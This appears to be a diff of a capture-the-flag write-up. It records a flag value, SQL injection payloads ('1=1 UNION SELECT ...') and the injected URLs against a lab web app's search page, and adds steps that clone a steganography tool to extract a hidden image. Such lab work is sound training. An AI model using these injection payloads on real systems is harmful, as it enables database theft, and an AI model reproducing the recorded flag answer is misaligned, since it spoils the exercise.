@@ -180,6 +180,8 @@ https://onlinehextools.com/xor-hex-numbers
 ```
 
 # Flag11
+Flag11: d843efc41266a0cc502dc23b149e5c95
+
 ID: 1=1 UNION SELECT comment12, titlec4 FROM images 
 Title: saepe
 Url : To find Flag11, use 16 leftmost characters of the Cookie Tampering Flag09 and download the file 3d8e5368ff73ab88cdccd05a07e1e19e.bin
@@ -202,6 +204,21 @@ http://129.241.200.165:19680/?page=searchimg
 http://129.241.200.165:19680/index.php?page=searchimg&id=1%3D1+UNION+SELECT+CONCAT%28downloads66%2C+comment12%2C+id43%2C+urlef%29%2C+titlec4+FROM+images&Submit=Submit#
 http://129.241.200.165:19680/index.php?page=download
 
+```
+
+### KALI VM - steganography
+```
+git clone https://github.com/raffg/steganography.git
+cd steganography
+
+pip install Pillow
+pip install image
+
+python3 -m pip install image
+
+python3 steganography.py drown.png
+
+open unmerged.png
 ```
 
 
